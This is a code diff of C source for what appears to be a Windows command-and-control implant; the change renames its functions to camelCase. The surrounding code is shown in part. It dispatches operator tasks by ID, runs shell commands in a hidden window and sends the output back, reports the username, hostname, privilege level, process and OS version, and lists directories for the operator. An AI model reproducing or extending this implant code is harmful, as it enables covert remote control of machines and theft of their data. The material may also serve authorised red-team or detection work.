@@ -10,14 +10,14 @@
 #define COMMAND_COUNT 3
 
 Command commands[COMMAND_COUNT] = {
-  {.id = 0, .function = identify_cmd },
-  {.id = 7, .function = shell_cmd },
+  {.id = 0, .function = identifyCmd },
+  {.id = 7, .function = shellCmd },
   
   // fs 
-  {.id = 100, .function = fs_dir_cmd },
+  {.id = 100, .function = fsDirCmd },
 };
 
-void execute_cmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
+void executeCmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
 
   printf("[+] Got task ID: %u\n", taskId);
   printf("    -> ActionId: %u\n", taskActionId); 
@@ -34,7 +34,7 @@ void execute_cmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) 
 
 }
 
-void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
+void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
   if (argc < 1) return;
   struct TLVBuild out = allocStruct(50);
 
@@ -70,7 +70,7 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   StartUpInfoA.hStdInput = hStdInPipeRead;
 
   if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo))
-  { send_output(taskId, "output", "Failed to create process", 0, NULL);
+  { sendData(taskId, "output", "Failed to create process", 0, NULL);
     return; }
   
   CloseHandle(hStdOutPipeWrite);
@@ -108,7 +108,7 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   LocalFree(pOutputBuffer);
   pOutputBuffer = NULL;
 
-  send_output(taskId, "output", "", out.bufsize, out.buf);
+  sendData(taskId, "output", "", out.bufsize, out.buf);
 
   CloseHandle(hStdOutPipeRead);
   CloseHandle(hStdInPipeWrite);
@@ -117,7 +117,7 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   free(out.buf);
 }
 
-void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
+void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
   printf("[+] agent is identifying..\n");
   
   struct TLVBuild identifyMessage = allocStruct(50);
@@ -139,7 +139,7 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
 
   addString(&identifyMessage, username);
   addString(&identifyMessage, hostname);
-  addByte(&identifyMessage, (char)IsProcessElevated());
+  addByte(&identifyMessage, (char)isProcessElevated());
   addString(&identifyMessage, "windows");
   addInt32(&identifyMessage, pid);
   addString(&identifyMessage, processName);
@@ -147,7 +147,7 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   addInt32(&identifyMessage, osinfo.dwMinorVersion);
   addInt32(&identifyMessage, osinfo.dwBuildNumber);
 
-  send_output(
+  sendData(
     taskId,
     "identify",
     "",
@@ -161,7 +161,7 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   free(identifyMessage.buf);
 }
 
-void fs_dir_cmd(int taskId, int argc, struct TLVBuild * tlv) {
+void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
   printf("[+] listing files\n");
 
   struct TLVBuild response = allocStruct(50);
@@ -185,7 +185,7 @@ void fs_dir_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   addInt32(&response, files);
   addBytes(&response, false, file_list.bufsize, file_list.buf);
 
-  send_output(
+  sendData(
     taskId,
     "output",
     "",
